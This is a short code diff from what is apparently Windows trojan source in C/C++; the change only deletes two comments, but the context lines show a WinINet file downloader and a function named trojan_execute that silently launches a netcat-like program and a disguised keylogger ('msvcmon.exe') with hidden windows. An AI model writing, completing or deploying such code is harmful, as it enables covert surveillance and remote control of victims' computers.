@@ -7,7 +7,6 @@
 
 void DownloadFile(const wchar_t* url, const wchar_t* filePath)
 {
-    // Use the wide-character version of InternetOpen
     HINTERNET hInternet = InternetOpenW(L"Downloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     HINTERNET hFile = InternetOpenUrlW(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
 
@@ -50,7 +49,6 @@ void trojan_execute()
     wchar_t kylgpath[MAX_PATH];
     swprintf(kylgpath, MAX_PATH, L"%s\\msvcmon.exe", desktopPath);
 
-    // Use the wide-character version of ShellExecute
     ShellExecuteW(NULL, L"open", ncpath, ncparams, NULL, SW_HIDE);
     ShellExecuteW(NULL, L"open", kylgpath, kylgparams, NULL, SW_HIDE);
 }
